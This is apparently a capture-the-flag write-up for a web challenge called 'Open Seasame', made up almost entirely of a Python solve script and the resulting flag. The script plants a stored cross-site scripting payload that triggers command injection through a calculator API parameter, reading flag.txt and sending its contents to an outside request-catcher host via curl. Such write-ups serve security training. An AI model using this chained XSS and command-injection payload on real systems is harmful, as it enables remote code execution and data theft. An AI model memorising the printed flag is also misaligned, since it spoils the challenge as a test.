# Open Seasame

Solved by: @Cookies to SELL

- Category: web
- Description: Does the CLI listen to magic?
- Challenge Files: server.py, admin,js

Flag format: CACI{.\*}

### Solutions:

```py
import requests
### DELIVER MALICIOUS PAYLOAD ###
payload = "<script>fetch('/api/cal?modifier=;curl https://ayam.requestcatcher.com/test?$(cat flag.txt)')</script>"
URL = "http://chal.competitivecyber.club:13337"

resp = requests.request("POST", URL + "/api/stats", json={"username": payload, "high_score": 0})
uuid = resp.json()['id']

print("api/stats/" + uuid)
```

**Flag:** `CACI{1_l0v3_c0mm4nd_1nj3ct10n}`


